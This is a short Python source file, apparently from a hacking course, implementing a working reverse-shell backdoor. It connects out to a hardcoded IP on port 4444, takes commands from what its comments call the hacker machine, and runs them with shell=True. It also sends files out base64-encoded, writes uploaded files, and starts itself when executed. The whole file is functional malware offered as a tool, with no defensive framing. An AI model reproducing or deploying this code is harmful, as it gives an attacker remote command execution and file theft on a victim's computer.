import socket, json
import subprocess
import os, base64
class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM is for TCP
        self.connection.connect((ip, port))  # Takes a tuple. IP, port

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b"" # Byte object not a string
        while (True):
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)  # Convert to json
            except ValueError:
                continue  # Need to receive more data

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell = True)

    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] Changing working directory to "+ path

    def read_file(self, path): # For downloading files
        with open(path,"rb") as file: # b for read as binary
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def run(self):
        while True:
            try:
                command = self.reliable_receive()  # Receive a command from the hacker machine
                if command[0] == 'exit':
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command)>1: # The command is not just cd
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1],command[2]) #Uploaded here
                else:
                    command_result = self.execute_system_command(command).decode()  # Execute this command, decode() converts byte to string

            except Exception: # On any exception
                command_result = "[-] Error occurred during execution"


            self.reliable_send(command_result)  # Report the result back to the hacker


#connection.send(bytes("\n[+] Connection established. \n")) # Send data to target machine
#received_data = connection.recv(1024) #1024 is buffer size. Will be able to receive 1024 B of data at once
#print(received_data)

my_backdoor = Backdoor("192.168.18.38", 4444)
my_backdoor.run()
    
